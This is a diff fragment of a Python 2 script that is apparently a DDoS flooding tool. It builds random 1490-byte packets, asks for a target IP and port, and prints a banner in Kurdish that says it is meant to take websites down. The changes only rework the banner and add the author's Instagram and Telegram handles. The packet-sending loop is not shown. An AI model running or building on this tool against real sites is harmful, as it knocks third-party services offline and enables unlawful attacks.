@@ -18,17 +18,19 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet KAKsaro")
+os.system("figlet kakSARO")
+print ("hershy ddos bo down krdny site")
 print
+print ("instagram : kak.saro")
+print 
+print ("telegram  : kak_saro")
 print
-print
-print     ("hershy ddos")
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("hershaka dastpedakat")
+os.system("figlet hershaka dastpedaka")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
